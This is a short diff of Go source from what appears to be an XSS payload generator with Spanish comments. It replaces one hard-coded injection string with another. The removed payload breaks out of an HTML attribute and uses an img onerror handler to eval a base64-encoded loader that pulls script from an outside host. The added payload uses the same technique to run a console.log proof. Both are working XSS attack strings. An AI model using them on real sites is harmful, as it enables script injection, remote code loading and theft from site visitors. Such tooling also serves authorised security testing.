@@ -32,9 +32,10 @@ func GeneratePayloadID() string {
 func GetAllPayloads(callbackServer string) []XSSPayload {
 	payloads := []XSSPayload{}
 
-	// === PAYLOAD ESPECÍFICO XSS HUNTER ===
-	// Usamos el payload exacto proporcionado, con el loader en Base64 ya definido
-	specificPayload := `"><img src=x id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8veHNzLnJlbGVhc2VzLmxpZmUiO2RvY3VtZW50LmJvZHkuYXBwZW5kQ2hpbGQoYSk7 onerror=eval(atob(this.id))>`
+	// === PAYLOAD ESPECÍFICO - CONSOLE LOG ===
+	// Payload con img tag, id en base64 y onerror que ejecuta el base64
+	// Base64 de: console.log('11223344')
+	specificPayload := `"><img src=x id=Y29uc29sZS5sb2coJzExMjIzMzQ0Jyk= onerror=eval(atob(this.id))>`
 
 	id1 := GeneratePayloadID()
 	payloads = append(payloads, XSSPayload{
